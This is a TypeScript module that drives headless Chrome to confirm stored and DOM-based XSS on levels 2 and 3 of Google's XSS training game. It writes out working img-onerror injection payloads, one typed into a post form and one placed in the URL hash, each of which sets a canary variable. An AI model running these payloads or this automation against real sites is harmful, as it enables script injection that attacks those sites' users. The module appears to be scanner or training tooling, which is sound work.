import puppeteer from "puppeteer-core";
import type { Browser } from "puppeteer-core";

const CHROME_PATHS = [
  process.env.CHROME_PATH,
  "/usr/local/bin/google-chrome",
  "/usr/bin/google-chrome",
  "/usr/bin/chromium",
  "/usr/bin/chromium-browser"
].filter((p): p is string => Boolean(p));

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

let browserPromise: Promise<Browser | null> | null = null;

async function getBrowser(): Promise<Browser | null> {
  if (!browserPromise) {
    browserPromise = (async () => {
      for (const executablePath of CHROME_PATHS) {
        try {
          return await puppeteer.launch({
            executablePath,
            headless: true,
            args: ["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
          });
        } catch {
          /* try next chrome path */
        }
      }
      return null;
    })();
  }
  return browserPromise;
}

export interface XssGameExploitResult {
  canary: string;
  level: 2 | 3;
}

/** Live stored-XSS confirmation for Google XSS game level 2 (PostDB + innerHTML sink). */
export async function probeXssGameLevel2StoredExploit(
  origin: string
): Promise<XssGameExploitResult | null> {
  const browser = await getBrowser();
  if (!browser) return null;
  const page = await browser.newPage();
  try {
    const canary = `thugirL2${Date.now().toString(36)}`;
    const payload = `<img src=x onerror="window.__thugirL2='${canary}'">`;
    await page.goto(new URL("/level2/frame", origin).toString(), {
      waitUntil: "domcontentloaded",
      timeout: 25000
    });
    await page.waitForSelector("#post-content", { timeout: 10000 });
    await page.type("#post-content", payload);
    await page.click("#post-form input[type=submit]");
    await sleep(800);
    const fired = await page.evaluate((expected) => (window as unknown as { __thugirL2?: string }).__thugirL2 === expected, canary);
    if (!fired) return null;
    return { canary, level: 2 };
  } catch {
    return null;
  } finally {
    await page.close().catch(() => undefined);
  }
}

/** Live DOM-XSS confirmation for Google XSS game level 3 (location.hash → chooseTab → jQuery .html()). */
export async function probeXssGameLevel3DomExploit(
  origin: string
): Promise<XssGameExploitResult | null> {
  const browser = await getBrowser();
  if (!browser) return null;
  const page = await browser.newPage();
  try {
    const canary = `thugirL3${Date.now().toString(36)}`;
    const payload = `1'><img src=x onerror="window.__thugirL3='${canary}'">`;
    const url = new URL("/level3/frame", origin);
    url.hash = encodeURIComponent(payload);
    await page.goto(url.toString(), { waitUntil: "domcontentloaded", timeout: 25000 });
    await sleep(800);
    const fired = await page.evaluate((expected) => (window as unknown as { __thugirL3?: string }).__thugirL3 === expected, canary);
    if (!fired) return null;
    return { canary, level: 3 };
  } catch {
    return null;
  } finally {
    await page.close().catch(() => undefined);
  }
}
